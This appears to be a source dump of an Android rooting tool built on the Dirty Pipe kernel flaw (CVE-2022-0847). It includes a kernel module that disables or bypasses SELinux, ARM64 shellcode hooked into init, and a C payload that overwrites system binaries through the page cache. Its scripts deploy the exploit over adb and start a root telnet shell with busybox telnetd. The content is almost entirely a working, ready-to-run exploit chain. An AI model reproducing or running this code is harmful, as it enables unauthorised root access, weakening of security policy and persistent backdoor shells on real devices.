+	if(selinux_state_ == NULL) {
+		pr_info("mymod_init: real_selinux_state == NULL\n");
+		return -EFAULT;
+	}
+#define USE_PERMISSIVE_DOMAIN
+#ifdef USE_PERMISSIVE_DOMAIN
+	if(selinux_blob_sizes_ == NULL){
+		pr_info("mymod_init: selinux_blob_sizes = NULL");
+	}else{
+		// Set context of current process (u:r:vendor_modprobe:s0) to permissive.
+		// Current process refers the process that is calling finit_module.
+		const struct cred *cred = current->cred;
+		if(cred == NULL){
+			pr_info("mymod_init: cred == NULL");
+			return -EFAULT;
+		}
+		if(cred->security == NULL){
+			pr_info("mymod_init: cred->security == NULL");
+			return -EFAULT;
+		}
+		if(ebitmap_set_bit_ == NULL){
+			pr_info("mymod_init: ebitmap_set_bit_ == NULL");
+			return -EFAULT;
+		}
+		if(sidtab_search_entry_ == NULL){
+			pr_info("mymod_init: ebitmap_set_bit_ == NULL");
+			return -EFAULT;
+		}
+		struct task_security_struct *tsec = cred->security + selinux_blob_sizes_->lbs_cred;
+		pr_info("mymod_init: Set current sid (%d) to permissive.", tsec->sid);
+
+		rcu_read_lock();
+		struct selinux_policy *policy = rcu_dereference(selinux_state_->policy);
+
+		struct sidtab_entry *entry = sidtab_search_entry_(policy->sidtab, tsec->sid);
+		if(entry == NULL){
+			pr_info("mymod_init: entry == NULL");
+			rcu_read_unlock();
+			return -EFAULT;
+		}
+		struct ebitmap *permissive = (struct ebitmap *)(((char*)&policy->policydb) + 560);
+		ebitmap_set_bit_(permissive, entry->context.type, 1);
+
+		rcu_read_unlock();
+	}
+#else
+	// It will set whole system permissive. A bit unsecure, I think.
+	pr_info("mymod_init: Setting selinux_state.enforcing=false. %lx %lx\n", (unsigned long)selinux_state_,
+			(unsigned long)&selinux_state_->enforcing);
+	bool old = READ_ONCE(selinux_state_->enforcing);
+	pr_info("mymod_init: Current value of selinux_state.enforcing=%d\n", old);
+	WRITE_ONCE(selinux_state_->enforcing, false);
+	bool b = READ_ONCE(selinux_state_->enforcing);
+	pr_info("mymod_init: New value of selinux_state.enforcing=%d\n", old);
+#endif
+
+	// It won't work because update_engine (permissive domain) doesn't exist before magisk policy patch.
+	//rc = security_context_to_sid_(selinux_state_, "update_engine", strlen("update_engine"),
+	//		&sid, GFP_KERNEL);
+	//if(rc != 0){
+	//	pr_info("mymod_init: failed to security_context_to_sid\n");
+	//	return -ENOENT;
+	//}else{
+	//	struct cred *new;
+
+	//	if(selinux_blob_sizes_ == NULL){
+	//		pr_info("mymod_init: selinux_blob_sizes = NULL");
+	//	}else{
+	//		pr_info("mymod_init: Change sid %d", sid);
+	//		struct task_security_struct *tsec = new->security + selinux_blob_sizes_->lbs_cred;
+	//		tsec->sid = sid;
+	//	}
+	//}
+
+	return -ENOMSG;
+}
+
+
+static void __exit mymod_exit(void)
+{
+	pr_info("mymod_exit: end\n");
+}
+module_init(mymod_init);
+module_exit(mymod_exit);
+
+MODULE_LICENSE("GPL v2");
+__asm__(".space 32, 0\n");
+
+```
+
+`release.sh`:
+
+```sh
+#!/bin/sh
+set -e
+
+version=$1
+dname="dirtypipe-android-$1"
+dir="dist/$dname"
+
+mkdir dist/
+mkdir "$dir"
+
+cp dirtypipe-android startup-root run.sh run.bat "$dir"
+
+mkdir "$dir"/magisk
+cp magisk/busybox "$dir"/magisk/
+
+cd dist/
+zip -r "$dname".zip "$dname"
+
+
+```
+
+`run.bat`:
+
+```bat
+@echo off
+
+set dir=/data/local/tmp
+set adb=adb -d
+
+%adb% push dirtypipe-android startup-root magisk/busybox %dir%
+%adb% shell chmod 755 %dir%/dirtypipe-android %dir%/startup-root %dir%/busybox
+%adb% shell %dir%/dirtypipe-android
+%adb% shell sleep 1
+%adb% shell %dir%/busybox telnet 127.0.0.1 10847
+
+
+```
+
+`run.sh`:
+
+```sh
+#!/bin/sh
+set -e
+
+dir=/data/local/tmp
+adb=${adb:-"adb"}
+
+$adb push dirtypipe-android startup-root magisk/busybox ${dir}
+$adb shell chmod 755 ${dir}/dirtypipe-android ${dir}/startup-root ${dir}/busybox
+$adb shell ${dir}/dirtypipe-android
+$adb shell sleep 1
+$adb shell ${dir}/busybox telnet 127.0.0.1 10847
+
+
+```
+
+`stage1.S`:
+
+```S
+    .arch armv8-a
+
+    .include "include.inc"
+
+    .global stage1_start
+    .global stage1_filename
+    .global stage1_data
+    .global stage1_len
+    .data
+
+stage1_data:
+
+stage1_filename:
+L_filename:
+    .asciz "/dev/.dirtypipe-0000"
+lib:
+    .asciz "/system/lib/libldacBT_enc.so"
+
+    .balign 4
+
+stage1_start:
+    stp x0, x1, [sp, #-16]!
+    stp x2, x3, [sp, #-16]!
+    stp x4, x5, [sp, #-16]!
+    stp x6, x7, [sp, #-16]!
+    stp x8, x9, [sp, #-16]!
+    stp x26, x27, [sp, #-16]!
+    stp x28, x29, [sp, #-16]!
+    str x30, [sp, #-16]!
+
+    // Detect root uid = 0
+    mov     x8, SYS_getuid
+    svc     0
+
+    cbnz    w0, return
+
+    // Detect init pid = 1
+    mov     x8, SYS_getpid
+    svc     0
+
+    cmp     w0, 1
+    bne     return
+
+    // To avoid later call of hook to execute payload, create file as mutex.
+    /* call openat(0, filename, O_CREAT|O_EXCL, 0) */
+    mov     x0, #0
+    // Must pass L_filename. If put stage1_filename, address is not determined until link time.
+    adr     x1, L_filename
+    mov     x2, O_CREAT|O_EXCL
+    mov     x3, xzr
+    mov     x8, #SYS_openat
+    svc     0
+
+    // return if fail to open (file exist)
+    tbnz    w0, #31, return
+
+    sub     sp, sp, 16
+
+    // syscall(SYS_gettid);
+    mov     x8, SYS_gettid
+    svc     0
+    str     w0, [sp, 8]
+
+    // clone(CLONE_CHILD_SETTID   | 
+    //       CLONE_CHILD_CLEARTID | 
+    //       SIGCHLD, 0, NULL, NULL, &ctid)
+    mov     x8, SYS_clone
+    add     x4, sp, 8           // ctid
+    mov     x3, xzr              // newtls
+    mov     x2, xzr              // ptid
+    mov     x1, xzr // stack
+    movl    x0, (CLONE_CHILD_SETTID + CLONE_CHILD_CLEARTID + SIGCHLD)
+    svc     0
+    str     w0, [sp, 8]         // save id
+
+    add     sp, sp, 16
+
+    // returned tid on parent, zero on child
+    cbnz    w0, return
+
+    // open and mmap stage2 payload from system lib. It circumvent execmem selinux check.
+    mov     x0, 0
+    adr     x1, lib
+    mov     x2, O_RDONLY
+    mov     x3, xzr
+    mov     x8, #SYS_openat
+    svc     0
+
+    mov     x4, x0
+
+    mov     x8, SYS_mmap
+    mov     x0, 0
+    mov     x3, MAP_SHARED             // args[3] = 0x22
+    mov     x5, xzr              // args[5] = 0x0
+    mov     x2, PROT_EXEC | PROT_READ
+    movl    x1, 0xa000           // args[1] = 0x1000
+    svc     0
+
+    // Launch stage2. Skip first instruction because we can't rewrite first byte.
+    add     x0, x0, 4
+    br      x0
+
+return:
+
+    ldr x30, [sp], #16
+    ldp x28, x29, [sp], #16
+    ldp x26, x27, [sp], #16
+    ldp x8, x9, [sp], #16
+    ldp x6, x7, [sp], #16
+    ldp x4, x5, [sp], #16
+    ldp x2, x3, [sp], #16
+    ldp x0, x1, [sp], #16
+
+    // First instruction of original function.
+    stp     x29, x30, [sp, #-32]!
+    // Back to original
+    b       end
+end:
+
+stage1_end:
+stage1_len:
+    .word stage1_end - stage1_data
+
+
+```
+
+`stage2-c.c`:
+
+```c
+/* SPDX-License-Identifier: GPL-2.0 */
+/*
+ * Copyright 2022 CM4all GmbH / IONOS SE
+ *
+ * author: Max Kellermann <max.kellermann@ionos.com>
+ *
+ * Proof-of-concept exploit for the Dirty Pipe
+ * vulnerability (CVE-2022-0847) caused by an uninitialized
+ * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
+ * file contents in the page cache, even if the file is not permitted
+ * to be written, immutable or on a read-only mount.
+ *
+ * This exploit requires Linux 5.8 or later; the code path was made
+ * reachable by commit f6dd975583bd ("pipe: merge
+ * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
+ * there before, it just provided an easy way to exploit it.
+ *
+ * There are two major limitations of this exploit: the offset cannot
+ * be on a page boundary (it needs to write one byte before the offset
+ * to add a reference to this page to the pipe), and the write cannot
+ * cross a page boundary.
+ *
+ * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
+ *
+ * Further explanation: https://dirtypipe.cm4all.com/
+ */
+
+#include <stdint.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/syscall.h>
+#include <sys/stat.h>
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <android/log.h>
+#include <sys/socket.h>
+#include <sys/un.h>
+
+typedef unsigned long u64;
+
+void dp();
+extern u64 mysyscall(u64, ...);
+extern void logerror(u64);
+
+struct global {
+	u64 libdl_addr;
+	void *(*dlopen)(const char *name, int flags);
+	void *(*dlsym)(const void *handle, const char *sym);
+	int (*vsnprintf)(char *buf, size_t size, const char* fmt, va_list ap);
+};
+
+int overwrite(struct global *global, int p[2], int fd, loff_t offset, const char *data, int data_size);
+void lo(struct global *global, const char *p, ...);
+#define INDEX "a"
+
+u64 mypipe(int fd[2]){
+	__asm__("mov x8, SYS_pipe2\n");
+	return mysyscall((u64)fd, 0);
+}
+
+u64 createfile(const char *f){
+	__asm__("mov x8, SYS_openat\n");
+	return mysyscall(0, f, O_CREAT | O_EXCL);
+}
+
+u64 mygettid() {
+	__asm__("mov x8, SYS_gettid\n");
+	return mysyscall(0);
+}
+
+u64 myfcntl(int fd, int flags){
+	__asm__("mov x8, SYS_fcntl\n");
+	return mysyscall(fd, flags);
+}
+
+u64 myopen(const char *p, int flags){
+	__asm__("mov x8, SYS_openat\n");
+	return mysyscall(0, p, flags);
+}
+u64 mywrite(int fd, const char *p, int len){
+	__asm__("mov x8, SYS_write\n");
+	return mysyscall(fd, p, len);
+}
+
+u64 myread(int fd, char *p, int len){
+	__asm__("mov x8, SYS_read\n");
+	return mysyscall(fd, p, len);
+}
+
+u64 myclose(int fd){
+	__asm__("mov x8, SYS_close\n");
+	return mysyscall(fd);
+}
+
+u64 mylseek(int fd, u64 offset, u64 whence){
+	__asm__("mov x8, SYS_lseek\n");
+	return mysyscall(fd, offset, whence);
+}
+
+u64 mysplice(int fd_in, loff_t *off_in, int fd_out, loff_t *off_out, size_t len, unsigned int flags){
+	__asm__("mov x8, SYS_splice\n");
+	return mysyscall(fd_in, off_in, fd_out, off_out, len, flags);
+}
+
+u64 mymmap(void *a, u64 len, int prot, int flags, int fd, off_t offset){
+	__asm__("mov x8, SYS_mmap\n");
+	return mysyscall((u64)a, len, prot, flags, fd, offset);
+}
+
+u64 mysocket(int af, int p, int q) {
+	__asm__("mov x8, SYS_socket\n");
+	return mysyscall(af, p, q);
+}
+
+u64 myconnect(int fd, struct sockaddr *a, int len) {
+	__asm__("mov x8, SYS_connect\n");
+	return mysyscall(fd, a, len);
+}
+
+u64 mywritev(unsigned long fd,const struct iovec *vec, unsigned long vlen){
+	__asm__("mov x8, SYS_writev\n");
+	return mysyscall(fd, vec, vlen);
+}
+
+u64 myexecve(const char *p, const char **argv, const char **envp) {
+	__asm__("mov x8, SYS_execve\n");
+	return mysyscall((u64)p, argv, envp);
+}
+
+static void prepare_pipe(struct global *global, int p[2])
+{
+	if (mypipe(p)) {
+	}
+
+	const unsigned pipe_size = myfcntl(p[1], F_GETPIPE_SZ);
+	char buffer[4096];
+
+	lo(global, "pipe_size: %d\n", pipe_size);
+
+	/* fill the pipe completely; each pipe_buffer will now have
+	   the PIPE_BUF_FLAG_CAN_MERGE flag */
+	for (unsigned r = pipe_size; r > 0;) {
+		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
+		mywrite(p[1], buffer, n);
+		r -= n;
+	}
+
+	/* drain the pipe, freeing all pipe_buffer instances (but
+	   leaving the flags initialized) */
+	for (unsigned r = pipe_size; r > 0;) {
+		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
+		myread(p[0], buffer, n);
+		r -= n;
+	}
+
+	/* the pipe is now empty, and if somebody adds a new
+	   pipe_buffer without initializing its "flags", the buffer
+	   will be mergeable */
+}
+
+int overwrite(struct global *global, int p[2], int fd, loff_t offset, const char *data, int data_size) {
+	if(mylseek(fd, 0, SEEK_SET) < 0){
+		lo(global, "lse");
+	}
+	/* splice one byte from before the specified offset into the
+	   pipe; this will add a reference to the page cache, but
+	   since copy_page_to_iter_pipe() does not initialize the
+	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
+	--offset;
+	loff_t nbytes = mysplice(fd, &offset, p[1], NULL, 1, 0);
+	if (nbytes < 0) {
+		lo(global, "spl");
+		return EXIT_FAILURE;
+	}
+	if (nbytes == 0) {
+		lo(global, "sho\n");
+		return EXIT_FAILURE;
+	}
+
+	/* the following write will not create a new pipe_buffer, but
+	   will instead write into the page cache, because of the
+	   PIPE_BUF_FLAG_CAN_MERGE flag */
+	nbytes = mywrite(p[1], data, data_size);
+	if (nbytes < 0) {
+		lo(global, "wri");
+		return EXIT_FAILURE;
+	}
+	if ((size_t)nbytes < data_size) {
+		lo(global, "sho\n");
+		return EXIT_FAILURE;
+	}
+	//lo(global, "ok");
+	return 0;
+}
+
+int mystrcmp(const char *a, const char *b){
+	for(; *a && *b; a++,b++){
+		if(*a > *b){
+			return 1;
+		}else if(*b > *a){
+			return -1;
+		}
+	}
+	if(*a > *b){
+		return 1;
+	}else if(*b > *a){
+		return -1;
+	}
+	return 0;
+}
+
+int mystrlen(const char *a){
+	int l = 0;
+	for(; a[l]; l++){}
+	return l;
+}
+
+int cmpsuf(const char *a, const char *b){
+	int alen = mystrlen(a);
+	int blen = mystrlen(b);
+	if(alen < blen){
+		return 0;
+	}
+	return mystrcmp(a + alen - blen, b) == 0;
+}
+
+void parse_line(const char *l, int len, struct global *global) {
+	u64 addr = 0;
+	for(int i = 0; l[i]; i++){
+		if(l[i] == '-'){
+			break;
+		}else{
+			addr <<= 4;
+			if('0' <= l[i] && l[i] <= '9'){
+				addr += l[i] - '0';
+			}else if('a' <= l[i] && l[i] <= 'f'){
+				addr += l[i] - 'a' + 10;
+			}
+		}
+	}
+	//logerror(*(u64*)l);
+	if(global->libdl_addr == 0 && cmpsuf(l, "/system/lib64/bootstrap/libdl.so")){
+		global->libdl_addr = addr;
+		global->dlopen = (typeof(global->dlopen))(global->libdl_addr + 0x1014);
+		global->dlsym = (typeof(global->dlsym))(global->libdl_addr + 0x1044);
+	}
+}
+
+int max(int a, int b){
+	return a > b ? a : b;
+}
+int min(int a, int b){
+	return a < b ? a : b;
+}
+
+void prepare_log(struct global *global) {
+	int fd = myopen("/proc/self/maps", O_RDONLY);
+	char linebuf[1000];
+	char ch;
+	int pos = 0;
+	while(myread(fd, &ch, 1) > 0){
+		if(ch == '\n'){
+			int len = min(pos, sizeof(linebuf) - 1);
+			linebuf[len] = 0;
+			if(len > 0){
+				parse_line(linebuf, len, global);
+			}
+			pos = 0;
+		}else{
+			if(pos < sizeof(linebuf) - 1){
+				linebuf[pos] = ch;
+			}
+			pos++;
+		}
+	}
+	myclose(fd);
+}
+
+void mymemcpy(char *dest, const char *src, int len){
+	for(int i = 0; i < len; i++){
+		dest[i] = src[i];
+	}
+}
+
+void mystrcpy(char *dest, const char *src){
+	mymemcpy(dest, src, mystrlen(src));
+}
+
+void mymemset(volatile char *dest, char ch, int len){
+	volatile int i;
+	for(i = 0; i < len; i++){
+		dest[i] = ch;
+	}
+}
+
+typedef struct __attribute__((__packed__)) {
+  unsigned char id;
+  uint16_t tid;
+  unsigned long realtime;
+} android_log_header_t;
+
+void writelog(const char *buf) {
+	android_log_header_t he;
+	he.id = 0;
+	he.tid = mygettid();
+	struct iovec vec[4];
+	vec[0].iov_base = (unsigned char *)&he;
+	vec[0].iov_len = sizeof(he);
+	vec[1].iov_base = "\x4";
+	vec[1].iov_len = 1;
+	vec[2].iov_base = "stage2";
+	vec[2].iov_len = 7;
+	vec[3].iov_base = (void *)buf;
+	vec[3].iov_len = mystrlen(buf) + 1;
+
+	int sockfd = mysocket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0);
+	struct sockaddr_un addr;
+	mymemset((char *)&addr, 0, sizeof(addr));
+	addr.sun_family = AF_UNIX;
+	mystrcpy(addr.sun_path, "/dev/socket/logdw");
+	int r = myconnect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
+	mywritev(sockfd, vec, 4);
+	myclose(sockfd);
+}
+
+void lo(struct global *global, const char *p, ...) {
+	va_list l;
+	va_start(l, p);
+
+	char buf[201];
+	mymemset(buf, 0, 201);
+	global->vsnprintf(buf, 200, p, l);
+	writelog(buf);
+
+	va_end(l);
+}
+
+void c_entry() {
+	const char *modprobe_path = "/vendor/bin/modprobe";
+	const char *libmod_path = "/vendor/lib/libstagefright_soft_mp3dec.so";
+
+	__asm__(".include \"include.inc\"\n");
+
+	struct global *global = (struct global *)mymmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, -1, 0);
+
+	prepare_log(global);
+
+	void *libc = global->dlopen("libc.so", 0);
+	global->vsnprintf = (typeof(global->vsnprintf))
+		global->dlsym(libc, "vsnprintf");
+
+	int fds = myopen(modprobe_path, O_RDONLY);
+	int fdmod = myopen(libmod_path, O_RDONLY);
+
+	int p[2];
+	prepare_pipe(global, p);
+
+	// Calculate address of modprobe-payload + mymod.ko
+	u64 next_payload = ((u64)c_entry) & ~(PAGE_SIZE-1);
+	next_payload += PAGE_SIZE;
+
+	overwrite(global, p, fds, 1, (char*)next_payload + 1, PAGE_SIZE - 1);
+	for(int i = 0; i < 4; i++){
+		overwrite(global, p, fdmod, i * PAGE_SIZE + 1, (char*)next_payload + PAGE_SIZE * (i+1) + 1, PAGE_SIZE - 1);
+	}
+
+    const char *selinux_context = "u:r:vendor_modprobe:s0";
+	int fdat = myopen("/proc/self/attr/exec", O_RDWR);
+	mywrite(fdat, selinux_context, mystrlen(selinux_context));
+	myclose(fdat);
+
+	myexecve("/vendor/bin/modprobe", NULL, NULL);
+
+	__asm__("mov x8, SYS_exit\n");
+	mysyscall(0);
+}
+
+```
+
+`stage2-payload-include.S`:
+
+```S
+.global stage2_payload
+.rodata
+stage2_payload:
+.incbin "stage2-payload"
+
+```
+
+`stage2.S`:
+
+```S
+    .arch armv8-a
+
+    .include "include.inc"
+
+    .global mysyscall
+    .global _start
+//    .global logerror
+
+    .global c_entry
+
+stage2_data:
+    .word 0 // dummy
+
+_start:
+    bl c_entry
+
+exit:
+    mov x0, xzr
+    mov x8, SYS_exit
+    svc 0
+
+mysyscall:
+    svc 0
+    ret
+
+//logerror:
+//    br x0
+
+
+
+```
+
+`stage2.lds`:
+
+```lds
+SECTIONS
+{
+. = 0x2000;
+.text : {
+stage2.o (.text)
+stage2-c.o (.text)
+*(.rodata)
+*(.rodata.*)
+}
+.data : {
+*(.data)
+*(.eh_frame*)
+}
+.bss : { *(.bss) }
+
+}
+
+```
+
+`startup-root`:
+
+```
+#!/system/bin/sh
+# Called from modprobe-payload
+# Now in root user + permissive domain (u:r:vendor_modprobe:s0)
+
+#id > /data/local/tmp/mylog1
+#cat /proc/self/status >> /data/local/tmp/mylog1
+
+export ANDROID_DATA=/data
+export ANDROID_ART_ROOT=/apex/com.android.art
+export HOME=/
+export ANDROID_TZDATA_ROOT=/apex/com.android.tzdata
+export SYSTEMSERVERCLASSPATH=/system/framework/com.android.location.provider.jar:/system/framework/services.jar:/system/framework/ethernet-service.jar:/apex/com.android.appsearch/javalib/service-appsearch.jar:/apex/com.android.media/javalib/service-media-s.jar:/apex/com.android.permission/javalib/service-permission.jar
+export TERM=xterm-256color
+export ANDROID_SOCKET_adbd=25
+export ANDROID_STORAGE=/storage
+export EXTERNAL_STORAGE=/sdcard
+export DOWNLOAD_CACHE=/data/cache
+export ANDROID_ASSETS=/system/app
+export DEX2OATBOOTCLASSPATH=/apex/com.android.art/javalib/core-oj.jar:/apex/com.android.art/javalib/core-libart.jar:/apex/com.android.art/javalib/okhttp.jar:/apex/com.android.art/javalib/bouncycastle.jar:/apex/com.android.art/javalib/apache-xml.jar:/system/framework/framework.jar:/system/framework/framework-graphics.jar:/system/framework/ext.jar:/system/framework/telephony-common.jar:/system/framework/voip-common.jar:/system/framework/ims-common.jar:/apex/com.android.i18n/javalib/core-icu4j.jar
+export BOOTCLASSPATH=/apex/com.android.art/javalib/core-oj.jar:/apex/com.android.art/javalib/core-libart.jar:/apex/com.android.art/javalib/okhttp.jar:/apex/com.android.art/javalib/bouncycastle.jar:/apex/com.android.art/javalib/apache-xml.jar:/system/framework/framework.jar:/system/framework/framework-graphics.jar:/system/framework/ext.jar:/system/framework/telephony-common.jar:/system/framework/voip-common.jar:/system/framework/ims-common.jar:/apex/com.android.i18n/javalib/core-icu4j.jar:/apex/com.android.appsearch/javalib/framework-appsearch.jar:/apex/com.android.conscrypt/javalib/conscrypt.jar:/apex/com.android.ipsec/javalib/android.net.ipsec.ike.jar:/apex/com.android.media/javalib/updatable-media.jar:/apex/com.android.mediaprovider/javalib/framework-mediaprovider.jar:/apex/com.android.os.statsd/javalib/framework-statsd.jar:/apex/com.android.permission/javalib/framework-permission.jar:/apex/com.android.permission/javalib/framework-permission-s.jar:/apex/com.android.scheduling/javalib/framework-scheduling.jar:/apex/com.android.sdkext/javalib/framework-sdkextensions.jar:/apex/com.android.tethering/javalib/framework-connectivity.jar:/apex/com.android.tethering/javalib/framework-tethering.jar:/apex/com.android.wifi/javalib/framework-wifi.jar
+export SHELL=/system/bin/sh
+export ANDROID_BOOTLOGO=1
+export ASEC_MOUNTPOINT=/mnt/asec
+export USER=root
+export TMPDIR=/data/local/tmp
+export PATH=/product/bin:/apex/com.android.runtime/bin:/apex/com.android.art/bin:/system_ext/bin:/system/bin:/system/xbin:/odm/bin:/vendor/bin:/vendor/xbin
+export ANDROID_ROOT=/system
+export ANDROID_I18N_ROOT=/apex/com.android.i18n
+
+#/data/local/tmp/magisk/magiskpolicy --save /data/local/tmp/policy-dump
+/data/local/tmp/magisk/magiskpolicy --magisk --live
+/data/local/tmp/busybox telnetd -l /bin/sh -p 10847 &
+
+# Work in progress
+
+#mkdir /dev/.magisk
+#cd /dev/.magisk || exit
+#
+#cp /data/local/tmp/magisk/* /dev/.magisk/
+#chmod 755 /dev/.magisk/*
+#chown root:root /dev/.magisk/*
+#
+#/dev/.magisk/magisk --daemon
+
+#/data/local/tmp/busybox sleep 3
+
+
+```
